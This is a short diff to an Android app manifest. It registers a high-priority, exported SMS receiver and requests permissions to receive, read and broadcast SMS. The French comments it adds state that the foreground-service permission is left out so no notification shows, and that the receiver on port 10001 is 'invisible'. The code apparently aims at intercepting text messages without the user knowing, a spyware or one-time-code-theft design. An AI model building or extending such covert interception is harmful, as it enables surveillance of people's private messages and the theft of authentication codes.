@@ -11,6 +11,7 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.BROADCAST_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- ✅ AUCUNE PERMISSION DE SERVICE PREMIER PLAN → PAS DE NOTIFICATION -->
 
     <application
         android:allowBackup="true"
@@ -30,6 +31,7 @@
             </intent-filter>
         </activity>
 
+        <!-- 📲 SMSReceiver — PORT 10001 = INVISIBLE -->
         <receiver android:name=".SMSReceiver" android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="999">
